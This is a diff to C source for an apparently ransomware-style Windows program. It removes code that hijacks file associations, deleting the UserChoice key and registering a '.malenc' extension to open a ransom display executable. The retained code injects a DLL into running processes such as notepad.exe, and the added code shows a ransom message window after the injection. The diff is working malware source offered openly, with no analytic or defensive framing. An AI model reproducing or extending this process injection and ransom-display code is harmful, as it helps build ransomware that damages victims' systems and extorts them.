@@ -5,56 +5,7 @@
 
 #include "get_relative_path.h"
 #include "attack.h"
-
-// Function to register a file extension to your executable
-int RegisterFileExtension(const char* extension, const char* progID, const char* exePath)
-{
-    if (!extension || !progID || !exePath)
-        return -1; // Invalid input
-
-    HKEY hKey;
-    LONG result;
-    char commandKey[512];
-
-    // Delete UserChoice to avoid Windows cache overriding
-    char userChoiceKey[256];
-    snprintf(userChoiceKey, sizeof(userChoiceKey),
-             "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\%s\\UserChoice",
-             extension);
-    RegDeleteKeyA(HKEY_CURRENT_USER, userChoiceKey);
-
-    // Associate extension with ProgID (per-user)
-    result = RegCreateKeyExA(HKEY_CURRENT_USER, extension, 0, NULL,
-                             REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
-    if (result != ERROR_SUCCESS)
-    {
-        printf("Error creating extension key\n");
-        return 1;
-    }
-    RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)progID, (DWORD)(strlen(progID) + 1));
-    RegCloseKey(hKey);
-
-    // Set the command to run display.exe
-    snprintf(commandKey, sizeof(commandKey), "Software\\Classes\\%s\\shell\\open\\command", progID);
-
-    result = RegCreateKeyExA(HKEY_CURRENT_USER, commandKey, 0, NULL,
-                             REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
-    if (result != ERROR_SUCCESS)
-    {
-        printf("Error creating command key\n");
-        return 2;
-    }
-
-    char commandWithArg[1024];
-    snprintf(commandWithArg, sizeof(commandWithArg), "\"%s\" \"%%1\"", exePath); // important quotes & %1
-    RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)commandWithArg, (DWORD)(strlen(commandWithArg) + 1));
-    RegCloseKey(hKey);
-
-    // Refresh Explorer to apply association immediately
-    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
-
-    return 0; // Success
-}
+#include "ransom_window.h"
 
 DWORD get_pid_from_list(const char *names[], size_t count)
 {
@@ -85,19 +36,6 @@ int main(void) {
     const char *processes[] = {
         "notepad.exe",
         "calc.exe",
-    };
-
-
-    /* Associate Ransom_display.exe with .malenc file format */
-    const char* extension = ".malenc";
-    const char* progID = "Maliciously Encrypted";
-    char exePath [MAX_PATH];
-    if (get_relative_path(exePath, sizeof(exePath), "ransom_display.exe") != 0) {
-        return 1;
-    }
-
-    if (RegisterFileExtension(extension, progID, exePath) != 0) {
-        return 1;
     };
 
     char dll[MAX_PATH];
@@ -149,6 +87,17 @@ int main(void) {
     // Wait and close
     WaitForSingleObject(h_thread, INFINITE);
     CloseHandle(h_process);
+
+    /* Display ransom message */
+
+    // Get the current module handle
+    HINSTANCE hInstance = GetModuleHandle(NULL);
+
+    // nCmdShow can just be SW_SHOW
+    int nCmdShow = SW_SHOW;
+
+    // Call the window creation function
+    return CreateMyWindow(hInstance, nCmdShow);
 
     return 0;
 }
